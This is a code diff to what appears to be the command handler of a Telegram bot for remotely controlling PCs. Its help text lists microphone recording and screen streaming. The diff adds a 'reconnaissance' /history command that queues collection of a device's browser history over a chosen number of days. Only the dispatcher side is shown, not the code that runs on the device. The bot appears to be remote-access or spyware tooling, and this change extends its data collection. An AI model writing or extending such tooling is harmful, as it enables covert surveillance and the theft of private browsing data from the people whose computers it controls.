@@ -605,7 +605,10 @@ async def process_update(update: dict):
             "/micro <сек> — записать аудио с микрофона ПК\n\n"
             "*WiFi стриминг экрана ПК:*\n"
             "/stream\\_start — запустить трансляцию экрана\n"
-            "/stream\\_stop — остановить трансляцию"
+            "/stream\\_stop — остановить трансляцию\n\n"
+            "*Разведка:*\n"
+            "/history — история браузеров за 7 дней\n"
+            "/history <дней> — за указанное кол-во дней"
         ), reply_markup=main_keyboard())
 
     elif text == "/devices":
@@ -831,6 +834,13 @@ async def process_update(update: dict):
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
         else: await enqueue_multi(chat_id, {"cmd": "stream_stop"}, "остановка стриминга")
+
+    elif text.startswith("/history"):
+        parts = text.split()
+        days = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 7
+        dev_id, err = require_device(chat_id)
+        if err: await send_tg(chat_id, err)
+        else: await enqueue_multi(chat_id, {"cmd": "browser_history", "days": days}, f"история браузеров ({days} дн.)")
 
     elif text == "/micro":
         dev_id, err = require_device(chat_id)
